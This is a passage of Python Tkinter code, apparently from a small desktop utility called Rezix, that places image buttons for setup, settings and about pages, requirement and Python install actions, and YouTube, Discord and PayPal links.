        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotosettings = Button(window, image=settingbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)

        installreq = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installrequirements)
        installreq.place(x=454,y=133)
        installpy = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installpython)
        installpy.place(x=454,y=187)
        checkpyver = Button(window, image=checkbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.checkversion)
        checkpyver.place(x=454,y=275)
    def about(self):
        bgg = Label(window, image=bg4, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotoabout = Button(window, image=aboutbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)

        ytblol = Button(window, image=ytb,bg='#242424',borderwidth=0, activebackground="#242424",command=self.youtube)
        ytblol.place(x=216,y=340)
        discolol = Button(window, image=disco,bg='#242424',borderwidth=0, activebackground="#242424",command=self.discord)
        discolol.place(x=282,y=342)
        paypalol = Button(window, image=paypa,bg='#242424',borderwidth=0, activebackground="#242424",command=self.paypal)
        paypalol.place(x=352,y=340)

Rezix()
window.mainloop()